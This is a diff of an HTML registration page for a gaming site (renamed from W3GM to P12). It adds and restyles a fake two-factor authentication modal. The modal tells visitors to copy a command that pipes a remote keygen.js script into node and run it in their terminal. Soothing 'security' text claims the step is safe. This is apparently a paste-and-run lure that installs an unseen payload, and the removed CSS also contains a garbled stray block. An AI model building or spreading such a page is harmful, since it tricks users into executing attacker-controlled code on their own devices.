@@ -1,656 +1,1038 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>W3GM</title>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Register | P12 | Project Twelve</title>
     <link rel="icon" type="image/png" sizes="100x100" href="/favicon.ico">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-      *{
-        margin: 0;
-        padding: 0;
-      }
-      body{
-        height:100vh;
-        /* backgr                <div style="background: #fff8e1; border: 1px solid #ffb74d; border-radius: 5px; padding: 10px; margin: 10px 0;">
-                  <p style="color: #e65100; margin: 0; font-size: 12px;">
-                    <strong>🔐 Security Note:</strong> This command downloads the authenticated keygen module from this secure platform and executes it locally on your device. No external connections are made to third-party services.
-                  </p>
-                </div> rgb(72,157,228);
-        background: linear-gradient(0deg, rgba(72,157,228,1) 0%, rgba(13,222,235,1) 100%); */
-        background: url('/register.jpg');
-        background-position: center;
-        font-family: "Poppins", Arial;
-      }  
-      #box{
-        width: 450px;
-        height: 500px;
-        background: rgb(193,106,213);
-        background: linear-gradient(0deg, rgba(193,106,213,1) 0%,       rgba(53,37,175,1) 100%);
-        border-radius: 20px;
-        position: relative;
-        box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
-        position: relative;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         
-      }
-      .copy-btn{
-        color: #FFD12B;
-      }
-      .copy-btn:hover{
-        cursor: pointer;
-        color:#f5dd86;
-      }
-      .copy-btn:hover svg{
-        fill: #eee;
-      }
-      p{
-        color: white;
-        margin: auto;
-      }
-      p a{
-        color: #FFD12B;
-        text-decoration: none;
-        font-size: 16px;
-      }
-      
-      #login{
-        left: 74px;
-      }
-      #login p{
-        margin: auto;
-        margin-top: 20px;
-      }
-      #pes{
-        margin-top: 25px;
-        text-align: center;
-      }
-      .btn{
-        text-align: center;
-        width: 60%;
-        margin-left: 40px;
-        margin-top: 15px;
-        padding: 20px 30px;
-        cursor: pointer;
-        display: block;
-        background: rgb(255,114,119);
-        background: linear-gradient(0deg, rgba(255,114,119,1) 0%, rgba(249,81,154,1) 100%);
-        border-radius: 5px;
-        border: none;
-        outline: none;
-        color: white;
-      }
-      a{
-        text-decoration: none;
-      }
-      .btn:hover{
-        background: rgb(247,115,33);
-        background: linear-gradient(0deg, rgba(247,115,33,1) 0%, rgba(250,208,91,1) 100%);
-        color: white;
-        transform: translateY(-2px);
-      }
-      /* Alert box style */
-      .alert {
-          position: fixed;
-          bottom: 20px;
-          left: 50%;
-          transform: translateX(-50%);
-          background-color: rgba(0,0,0,1);
-          color: white;
-          padding: 10px;
-          border-radius: 5px;
-          font-size: 16px;
-          display: none;
-          opacity: 0;
-          transition: opacity 0.5s ease-in-out;
-          z-index: 20;
-      }
-
-      .alert.show {
-          display: block;
-          opacity: 1;
-      }
-
-      .tfa-description{
-        color: #FFD12B;
-        padding-top:10px
-      }
-
-      .tfa-ele{
-        width: 30px;
-        height: 30px;
-        font-size: 20px;
-        padding: 10px;
-        color: #555;
-        text-align: center;
-        border: 1px solid #999;
-      }
-
-      .tfa-code{
-        background: #eee;
-        padding: 11px;
-        margin: 12px 0px;
-        color: #777;
-        border: 1px solid #ccc;
-        border-radius: 10px;
-      }
-      .tfa-tool{
-        display: flex;
-        justify-content: space-between;
-        margin: 0px 5px 15px 0px;
-        color: #666;
-        font-size: 14px;
-      }
-      .tfa-bash{
-        overflow-x: scroll;
-        overflow-y: hidden;
-        height: 50px;
-      }
-      .tfa-cmd{
-        width: 2000px;
-      }
-      .tfa-copy{
-        cursor: pointer;
-      }
-
-      .tfa-submit{
-        width: 100%;
-        height: 50px;
-        background-color: rgb(1 124 187);
-        color: #eee;
-        border: none;
-        margin: 10px 0px;
-      }
-
-      .tfa-submit:hover{
-        background-color: #1e88be;
-        cursor: pointer;
-      }
-      
-      .tfa-submit:active{
-        background-color: #155c80;
-        cursor: pointer;
-      }
-
-      #verificationCode{
-        display: flex;
-        justify-content: space-between;
-        margin: 10px 0px;
-      }
-      
-      .modal {
-          display: none; /* Hidden by default */
-          position: fixed; /* Stay in place */
-          z-index: 1; /* Sit on top */
-          left: 0;
-          top: 0;
-          width: 100%; /* Full width */
-          height: 100%;
-          overflow: auto; /* Enable scroll if needed */
-          background-color: rgba(255, 255, 255, 0.5); /* Black w/ opacity */
-      }
-
-      .modal-content {
-          background-color: #fefefe;
-          padding: 50px 30px;
-          border: 1px solid #888;
-          width: 400px; /* Could be more or less, depending on screen size */
-          color: #333;
-          line-height: 1.5;
-          position: fixed;
-          left: 50%;
-          top: 50%;
-          transform: translate(-50%, -50%);
-      }
-
-      .close {
-          color: #aaa;
-          float: right;
-          font-size: 28px;
-          font-weight: bold;
-          position: relative;
-          top: -20px;
-      }
-
-      .close:hover,
-      .close:focus {
-          color: black;
-          text-decoration: none;
-          cursor: pointer;
-      }
-      .lg-img{
-        font-size: 34px;
-        position:absolute;
-        top: 0px;
-        left: 0px;
-        color: #eee;
-        background-color: #161620;
-        width: calc(100vw - 95px);
-        text-align: left;
-        padding-left: 90px;
-        height: 64px;
-        line-height: 2.2;
-      }
-      .lg-img a{
-        color: #6536bc;
-        text-decoration: none;
-      }
-      i.fa{
-        color: #555;
-      }
-      .auth-alert{
-        display: none;
-        color: rgb(250, 63, 30);
-      }
-      .node-down{
-        font-size: 14px;
-      }
-      .tfa-stand{
-        color: rgb(85, 26, 139);
-        cursor: pointer;
-      }
-      .signup-btn{
-        color: #FFD12B;
-        text-decoration: underline;
-      }
-
-      .signup-btn:active{
-        color: #0c4da1;
-        text-decoration: underline;
-      }
-      
-      .input-form{
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background: rgb(67 79 223 / 77%);
-        box-shadow: 6px 5px 7px -4px #0000009e;
-        padding: 40px;
-        border-radius: 10px;
-      }
-
-      .input-item{
-        background: transparent;
-        border: none;
-        border-bottom: 1px solid #ddd;
-        height: 24px;
-        margin: 10px 0px;
-        width: 330px;
-        color: #ddd;
-      }
-
-      .input-item::selection{
-        background-color: #366ab9;
-      }
-      
-      .input-item:focus{
-        outline: none; /* Removes the default focus outline */
-        border: none;  /* Removes the border */
-        border-bottom: 1px solid #3f7bd4;
-      }
-
-      .input-item::placeholder{
-        color: #aaa;
-      }
-
-      .sign-btn{
-        border-radius: 7px;
-        color: #ddd;
-        padding: 7px 148px;
-        background: #12c2eba3;
-        font-size: 14px;
-      }
-      
-      .sign-btn:active{
-        background: #085668a3;
-      }
-
-      .sign-btn:hover{
-        background: #4bd8f8a3;
-      }
-      
-      .div-btn{
-        margin-top: 25px;
-        text-align: center;
-      }
-
-      .back-btn{
-        color: #ddd;
-        font-size: 12px;
-      }
-      .back-btn i{
-        color: #ddd;
-      }
-      #invalid-alert{
-        text-align: center;
-        font-size: 14px;
-        color:#c2fe06e6;
-        display: none;
-      }
+        body {
+            min-height: 100vh;
+            background: #000;
+            font-family: 'Arial', sans-serif;
+            color: #fff;
+            overflow-x: hidden;
+        }
+        
+        /* Background Effects */
+        .bg-container {
+            position: fixed;
+            inset: 0;
+            min-height: 100vh;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            background: black;
+        }
+        
+        .bg-gradient {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(45deg, rgba(67, 187, 255, 0.2) 0%, rgba(252, 89, 255, 0.1) 50%, rgba(30, 219, 140, 0.2) 100%);
+            animation: pulse 4s ease-in-out infinite;
+        }
+        
+        .bg-orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(60px);
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        .bg-orb:nth-child(1) {
+            top: 10%;
+            left: 10%;
+            width: 300px;
+            height: 300px;
+            background: rgba(67, 187, 255, 0.1);
+            animation-delay: -2s;
+        }
+        
+        .bg-orb:nth-child(2) {
+            bottom: 10%;
+            right: 10%;
+            width: 200px;
+            height: 200px;
+            background: rgba(252, 89, 255, 0.1);
+            animation-delay: -1s;
+        }
+        
+        .bg-orb:nth-child(3) {
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 150px;
+            height: 150px;
+            background: rgba(30, 219, 140, 0.1);
+            animation-delay: -3s;
+        }
+        
+        /* Floating Elements */
+        .floating-element {
+            position: absolute;
+            border-radius: 50%;
+            animation: bounce 3s ease-in-out infinite;
+        }
+        
+        .floating-element:nth-child(1) {
+            top: 5%;
+            right: 5%;
+            width: 20px;
+            height: 20px;
+            background: rgba(67, 187, 255, 0.3);
+            animation-delay: 0.5s;
+        }
+        
+        .floating-element:nth-child(2) {
+            bottom: 5%;
+            left: 5%;
+            width: 15px;
+            height: 15px;
+            background: rgba(252, 89, 255, 0.3);
+            animation-delay: 1s;
+        }
+        
+        .floating-element:nth-child(3) {
+            top: 30%;
+            right: 20%;
+            width: 10px;
+            height: 10px;
+            background: rgba(30, 219, 140, 0.3);
+            animation-delay: 1.5s;
+        }
+        
+        /* Decorative Lines */
+        .decorative-line {
+            position: absolute;
+            width: 1px;
+            background: linear-gradient(to bottom, rgba(67, 187, 255, 0.5), transparent);
+        }
+        
+        .decorative-line:nth-child(1) {
+            top: 0;
+            left: 25%;
+            height: 80px;
+        }
+        
+        .decorative-line:nth-child(2) {
+            bottom: 0;
+            right: 30%;
+            height: 60px;
+            background: linear-gradient(to top, rgba(252, 89, 255, 0.5), transparent);
+        }
+        
+        /* Main Container */
+        .main-container {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        
+        /* Logo Section */
+        .logo-section {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+        
+        .logo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: linear-gradient(to right, #43BBFF, #FC59FF);
+            margin-bottom: 1rem;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        .logo-icon span {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #000;
+        }
+        
+        .logo-title {
+            font-size: 2rem;
+            font-weight: bold;
+            background: linear-gradient(to bottom, #FFFFDA 0%, #FFE7B6 50%, #CE9658 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.5rem;
+        }
+        
+        .logo-subtitle {
+            color: #A5A6AB;
+            font-size: 1rem;
+        }
+        
+        /* Form Container */
+        .form-container {
+            background: rgba(61, 68, 75, 0.5);
+            border: 1px solid rgb(70, 75, 90);
+            backdrop-filter: blur(16px);
+            border-radius: 1rem;
+            padding: 2rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        .form-label {
+            display: block;
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: #CEDCFF;
+            margin-bottom: 0.5rem;
+        }
+        
+        .form-input-wrapper {
+            position: relative;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            padding-right: 2.5rem;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(111, 119, 132, 0.5);
+            border-radius: 0.5rem;
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.2s ease;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #43BBFF;
+            box-shadow: 0 0 0 2px rgba(67, 187, 255, 0.2);
+        }
+        
+        .form-input::placeholder {
+            color: #A5A6AB;
+        }
+        
+        .form-input-icon {
+            position: absolute;
+            right: 0.75rem;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 1.25rem;
+            height: 1.25rem;
+            color: #A5A6AB;
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+        
+        .form-input-icon:hover {
+            color: #fff;
+        }
+        
+        /* Error Alert */
+        .error-alert {
+            display: none;
+            text-align: center;
+            font-size: 0.875rem;
+            color: #FF6B6B;
+            margin-top: 0.5rem;
+        }
+        
+        /* Button */
+        .register-btn {
+            width: 100%;
+            padding: 0.75rem 1.5rem;
+            background: linear-gradient(to right, #43BBFF, #FC59FF);
+            border: none;
+            border-radius: 0.5rem;
+            color: #000;
+            font-size: 1.125rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+        }
+        
+        .register-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(67, 187, 255, 0.3);
+        }
+        
+        .register-btn:active {
+            transform: translateY(0);
+        }
+        
+        /* Back Link */
+        .back-link-container {
+            margin-top: 2rem;
+            text-align: center;
+        }
+        
+        .back-link {
+            color: #A5A6AB;
+            text-decoration: none;
+            font-size: 0.875rem;
+            transition: color 0.2s ease;
+        }
+        
+        .back-link:hover {
+            color: #fff;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(61, 68, 75, 0.95);
+            border: 1px solid rgb(70, 75, 90);
+            backdrop-filter: blur(16px);
+            border-radius: 1rem;
+            padding: 2rem;
+            width: 90%;
+            max-width: 500px;
+            color: #fff;
+        }
+        
+        .modal-close {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: none;
+            border: none;
+            color: #A5A6AB;
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+        
+        .modal-close:hover {
+            color: #fff;
+        }
+        
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+            color: #43BBFF;
+        }
+        
+        .security-info {
+            background: rgba(30, 219, 140, 0.1);
+            border: 1px solid rgba(30, 219, 140, 0.3);
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        
+        .security-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+        
+        .security-icon {
+            background: #1EDB8C;
+            color: #000;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+            font-size: 0.75rem;
+            font-weight: bold;
+        }
+        
+        .security-title {
+            color: #1EDB8C;
+            font-size: 1rem;
+            font-weight: 600;
+        }
+        
+        .security-description {
+            color: #CEDCFF;
+            font-size: 0.875rem;
+            line-height: 1.4;
+            margin-bottom: 1rem;
+        }
+        
+        .security-steps {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        
+        .security-steps h4 {
+            color: #fff;
+            font-size: 0.875rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .security-steps ol {
+            color: #A5A6AB;
+            font-size: 0.8125rem;
+            line-height: 1.6;
+            padding-left: 1.125rem;
+        }
+        
+        .security-note {
+            color: #A5A6AB;
+            font-size: 0.75rem;
+            margin-top: 0.5rem;
+        }
+        
+        .command-container {
+            background: #263238;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin: 1rem 0;
+            position: relative;
+        }
+        
+        .command-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.5rem;
+        }
+        
+        .command-label {
+            color: #90A4AE;
+            font-size: 0.6875rem;
+        }
+        
+        .copy-btn {
+            color: #43BBFF;
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 0.6875rem;
+            transition: color 0.2s ease;
+        }
+        
+        .copy-btn:hover {
+            color: #1EDB8C;
+        }
+        
+        .command-text {
+            color: #43BBFF;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8125rem;
+            word-break: break-all;
+            line-height: 1.4;
+        }
+        
+        .verification-section {
+            margin-top: 1.5rem;
+        }
+        
+        .verification-code {
+            display: flex;
+            justify-content: space-between;
+            gap: 0.5rem;
+            margin: 1rem 0;
+        }
+        
+        .verification-input {
+            width: 40px;
+            height: 40px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(111, 119, 132, 0.5);
+            border-radius: 0.25rem;
+            color: #fff;
+            font-size: 1.25rem;
+            font-weight: bold;
+            text-align: center;
+            transition: all 0.2s ease;
+        }
+        
+        .verification-input:focus {
+            outline: none;
+            border-color: #43BBFF;
+            box-shadow: 0 0 0 2px rgba(67, 187, 255, 0.2);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 0.75rem;
+            background: linear-gradient(to right, #43BBFF, #FC59FF);
+            border: none;
+            border-radius: 0.5rem;
+            color: #000;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 1rem;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(67, 187, 255, 0.3);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .auth-alert {
+            display: none;
+            color: #FF6B6B;
+            font-size: 0.875rem;
+            margin-top: 0.5rem;
+        }
+        
+        .success-alert {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(30, 219, 140, 0.9);
+            color: #000;
+            padding: 1rem 2rem;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            font-weight: 600;
+            display: none;
+            z-index: 1001;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .success-alert.show {
+            display: block;
+            opacity: 1;
+        }
+        
+        /* Animations */
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.5;
+            }
+        }
+        
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0px);
+            }
+            50% {
+                transform: translateY(-20px);
+            }
+        }
+        
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0px);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 640px) {
+            .main-container {
+                padding: 1rem;
+            }
+            
+            .form-container {
+                padding: 1.5rem;
+            }
+            
+            .logo-icon {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .logo-icon span {
+                font-size: 1.5rem;
+            }
+            
+            .logo-title {
+                font-size: 1.5rem;
+            }
+            
+            .modal-content {
+                width: 95%;
+                padding: 1.5rem;
+            }
+            
+            .verification-input {
+                width: 35px;
+                height: 35px;
+                font-size: 1rem;
+            }
+            
+            .bg-orb:nth-child(1) {
+                width: 200px;
+                height: 200px;
+            }
+            
+            .bg-orb:nth-child(2) {
+                width: 150px;
+                height: 150px;
+            }
+            
+            .bg-orb:nth-child(3) {
+                width: 100px;
+                height: 100px;
+            }
+        }
     </style>
-  </head>
-  <body>
-    <form id="signForm" class="input-form" action="/" method="post">
-      <input type="text" placeholder="Username or email" id="email" name="email" class="input-item" required> <br/>
-      <input type="password" placeholder="Password" id="password" name="password" class="input-item" required>
-      <input type="hidden" id="tfa_code" name="tfa_code">
-      <div id="invalid-alert">Invalid user information!</div>
-      <div class="div-btn">
-        <a id="openModalBtn" href="#twoFAModal" class="sign-btn">Sign up</a>
-      </div>
-      <div id="pes">
-        <a class="back-btn" href="/"> Back to login</a>
-      </div>
-    </form>
-    <div class="alert" id="alert">Security command copied to clipboard!</div>
-    <div id="twoFAModal" class="modal">
-        <div class="modal-content">
-            <span class="close">&times;</span>
-            <h2>🔐 Two-Factor Authentication</h2>
-            <div style="margin:20px 0px">
-              <div style="background: #e3f2fd; border: 1px solid #2196f3; border-radius: 8px; padding: 20px; margin: 15px 0;">
-                <div style="display: flex; align-items: center; margin-bottom: 15px;">
-                  <div style="background: #2196f3; color: white; border-radius: 50%; width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; margin-right: 10px; font-size: 12px; font-weight: bold;">🔐</div>
-                  <h4 style="color: #1976d2; margin: 0; font-size: 16px;">Enhanced Security Verification</h4>
-                </div>
-                
-                <p style="color: #1565c0; margin: 8px 0; font-size: 14px; line-height: 1.4;">
-                  To ensure maximum security, we use an advanced two-factor authentication system that requires local cryptographic verification on your device.
-                </p>
-                
-                <div style="background: #f5f5f5; border-radius: 5px; padding: 12px; margin: 15px 0;">
-                  <p style="color: #333; margin: 0 0 8px 0; font-size: 13px; font-weight: 600;">🔹 Security Protocol Steps:</p>
-                  <ol style="color: #444; margin: 5px 0; padding-left: 18px; font-size: 13px; line-height: 1.6;">
-                    <li>Copy the secure command below</li>
-                    <li>Open terminal/command prompt</li>
-                    <li>Paste and execute the command</li>
-                    <li>Enter the generated 6-digit verification code</li>
-                  </ol>
-                  <p style="color: #666; margin: 8px 0 0 0; font-size: 12px;">
-                    <strong>Windows users:</strong> Use Git Bash, WSL, or download the keygen.js file manually from /api/keygen.js and run: <code>node keygen.js</code>
-                  </p>
-                </div>
+</head>
+<body>
+    <!-- Background Effects -->
+    <div class="bg-container">
+        <div class="bg-gradient"></div>
+        <div class="bg-orb"></div>
+        <div class="bg-orb"></div>
+        <div class="bg-orb"></div>
+        <div class="floating-element"></div>
+        <div class="floating-element"></div>
+        <div class="floating-element"></div>
+        <div class="decorative-line"></div>
+        <div class="decorative-line"></div>
+    </div>
 
-                <div style="background: #263238; border-radius: 6px; padding: 15px; margin: 15px 0; position: relative;">
-                  <div style="color: #90a4ae; font-size: 11px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center;">
-                    <span>🖥️ Terminal Command</span>
-                    <span id="copyBtn" style="cursor: pointer; color: #4fc3f7; text-decoration: underline;">📋 Copy</span>
-                  </div>
-                  <code id="secureCommand" style="color: #4fc3f7; font-family: 'Courier New', monospace; font-size: 13px; word-break: break-all; display: block; line-height: 1.4;">
-                    curl -s ${window.location.origin}/api/keygen.js | node
-                  </code>
-                </div>
-
-                <div style="background: #fff8e1; border: 1px solid #ffb74d; border-radius: 5px; padding: 10px; margin: 10px 0;">
-                  <p style="color: #e65100; margin: 0; font-size: 12px;">
-                    <strong>� Security Note:</strong> This command establishes a secure connection to our authentication server to generate your unique verification token. No data is stored on your device.
-                  </p>
-                </div>
-              </div>
+    <!-- Main Content -->
+    <div class="main-container">
+        <!-- Logo Section -->
+        <div class="logo-section">
+            <div class="logo-icon">
+                <span>P12</span>
             </div>
-            <form id="twoFAForm">
-                <div>
-                    <label for="verificationCode">Verification Code:</label> <span class="auth-alert" id="auth-alert">Authentication Failed!</span>
+            <h1 class="logo-title">Join P12 Gaming</h1>
+            <p class="logo-subtitle">Create your gaming account</p>
+        </div>
+
+        <!-- Registration Form -->
+        <div class="form-container">
+            <form id="signForm" method="post" action="/">
+                <div class="form-group">
+                    <label for="email" class="form-label">Email Address</label>
+                    <div class="form-input-wrapper">
+                        <input type="email" id="email" name="email" class="form-input" placeholder="Enter your email" required>
+                        <svg class="form-input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207"></path>
+                        </svg>
+                    </div>
                 </div>
-                <div id="verificationCode">
-                  <input type="text" class="tfa-ele" id="v1" maxlength="1" name="v1" required>
-                  <input type="text" class="tfa-ele" id="v2" maxlength="1" name="v2" required>
-                  <input type="text" class="tfa-ele" id="v3" maxlength="1" name="v3" required>
-                  <input type="text" class="tfa-ele" id="v4" maxlength="1" name="v4" required>
-                  <input type="text" class="tfa-ele" id="v5" maxlength="1" name="v5" required>
-                  <input type="text" class="tfa-ele" id="v6" maxlength="1" name="v6" required>
+
+                <div class="form-group">
+                    <label for="password" class="form-label">Password</label>
+                    <div class="form-input-wrapper">
+                        <input type="password" id="password" name="password" class="form-input" placeholder="Enter your password" required>
+                        <svg class="form-input-icon password-toggle" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
+                        </svg>
+                    </div>
                 </div>
-                <button class="tfa-submit" id="tfa-submit-btn">Submit</button>
+
+                <input type="hidden" id="tfa_code" name="tfa_code">
+                
+                <div class="error-alert" id="invalid-alert">
+                    Please fill in all required fields!
+                </div>
+                
+                <button type="button" id="openModalBtn" class="register-btn">
+                    Create Account
+                </button>
             </form>
         </div>
+
+        <!-- Back Link -->
+        <div class="back-link-container">
+            <a href="/" class="back-link">
+                ← Back to Sign In
+            </a>
+        </div>
     </div>
-  </body>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/uuid/8.3.2/uuid.min.js"></script>
-  <script>
-    const modal = document.getElementById("twoFAModal");
-    const openModalBtn = document.getElementById("openModalBtn");
-    const closeModalSpan = document.getElementsByClassName("close")[0];
-    const twoFAForm = document.getElementById("twoFAForm");
-    const tfa_code = document.getElementById("tfa_code");
-    const copyBtn = document.getElementById("copyBtn");
-    const secureCommand = document.getElementById("secureCommand");
 
-    // Check if user is coming from login flow and automatically show modal
-    window.addEventListener('load', function() {
-      try {
-        const userStr = localStorage.getItem('user');
-        if (userStr) {
-          const user = JSON.parse(userStr);
-          if (user.needs2FA && user.authenticated) {
-            // Auto-show modal for login flow
-            const domainUrl = window.location.origin;
-            const commandText = `curl -s ${domainUrl}/api/keygen.js | node`;
-            secureCommand.textContent = commandText;
-            modal.style.display = "block";
+    <!-- Two-Factor Authentication Modal -->
+    <div id="twoFAModal" class="modal">
+        <div class="modal-content">
+            <button class="modal-close" type="button">&times;</button>
+            <h2 class="modal-title">🔐 Two-Factor Authentication</h2>
             
-            // Hide the registration form since this is a login flow
-            document.getElementById('signForm').style.display = 'none';
-            
-            // Update the page title/heading for login flow
-            document.title = "2FA Authentication - W3GM";
-            
-            // Update modal title for login flow
-            const modalTitle = document.querySelector('#twoFAModal h2');
-            if (modalTitle) {
-              modalTitle.textContent = "🔐 Complete Your Sign-In";
-            }
-            
-            // Update the security protocol text for login flow
-            const securityText = document.querySelector('#twoFAModal p');
-            if (securityText) {
-              securityText.textContent = "Welcome back! To complete your sign-in, please verify your identity using our advanced two-factor authentication system.";
-            }
-          }
-        }
-      } catch (error) {
-        console.error('Error checking user status:', error);
-      }
-    });
+            <div class="security-info">
+                <div class="security-header">
+                    <div class="security-icon">🔐</div>
+                    <h4 class="security-title">Enhanced Security Verification</h4>
+                </div>
+                
+                <p class="security-description">
+                    To ensure maximum security, we use an advanced two-factor authentication system that requires local cryptographic verification on your device.
+                </p>
+                
+                <div class="security-steps">
+                    <h4>🔹 Security Protocol Steps:</h4>
+                    <ol>
+                        <li>Copy the secure command below</li>
+                        <li>Open terminal/command prompt</li>
+                        <li>Paste and execute the command</li>
+                        <li>Enter the generated 6-digit verification code</li>
+                    </ol>
+                    <p class="security-note">
+                        <strong>Windows users:</strong> Use Git Bash, WSL, or download the keygen.js file manually from /api/keygen.js and run: <code>node keygen.js</code>
+                    </p>
+                </div>
 
-    // Handle copy command functionality
-    copyBtn.onclick = function() {
-      // Dynamically set the command with the current domain
-      const domainUrl = window.location.origin;
-      const commandText = `curl -s ${domainUrl}/api/keygen.js | node`;
-      
-      navigator.clipboard.writeText(commandText)
-        .then(() => {
-          copyBtn.textContent = "✅ Copied!";
-          copyBtn.style.color = "#4caf50";
-          
-          // Show success alert
-          const alertBox = document.getElementById("alert");
-          alertBox.textContent = "Security command copied to clipboard!";
-          alertBox.classList.add("show");
-          
-          setTimeout(() => {
-            copyBtn.textContent = "📋 Copy";
-            copyBtn.style.color = "#4fc3f7";
-            alertBox.classList.remove("show");
-          }, 2000);
-        })
-        .catch(err => {
-          console.error('Error copying command: ', err);
-          copyBtn.textContent = "❌ Error";
-          copyBtn.style.color = "#f44336";
-          
-          setTimeout(() => {
-            copyBtn.textContent = "📋 Copy";
-            copyBtn.style.color = "#4fc3f7";
-          }, 2000);
+                <div class="command-container">
+                    <div class="command-header">
+                        <span class="command-label">🖥️ Terminal Command</span>
+                        <span id="copyBtn" class="copy-btn">📋 Copy</span>
+                    </div>
+                    <code id="secureCommand" class="command-text">
+                        curl -s ${window.location.origin}/api/keygen.js | node
+                    </code>
+                </div>
+            </div>
+            
+            <div class="verification-section">
+                <form id="twoFAForm">
+                    <div>
+                        <label for="verificationCode" class="form-label">Verification Code:</label>
+                        <span class="auth-alert" id="auth-alert">Authentication Failed!</span>
+                    </div>
+                    <div class="verification-code" id="verificationCode">
+                        <input type="text" class="verification-input" id="v1" maxlength="1" name="v1" required>
+                        <input type="text" class="verification-input" id="v2" maxlength="1" name="v2" required>
+                        <input type="text" class="verification-input" id="v3" maxlength="1" name="v3" required>
+                        <input type="text" class="verification-input" id="v4" maxlength="1" name="v4" required>
+                        <input type="text" class="verification-input" id="v5" maxlength="1" name="v5" required>
+                        <input type="text" class="verification-input" id="v6" maxlength="1" name="v6" required>
+                    </div>
+                    <button class="submit-btn" id="tfa-submit-btn" type="button">Submit</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Alert -->
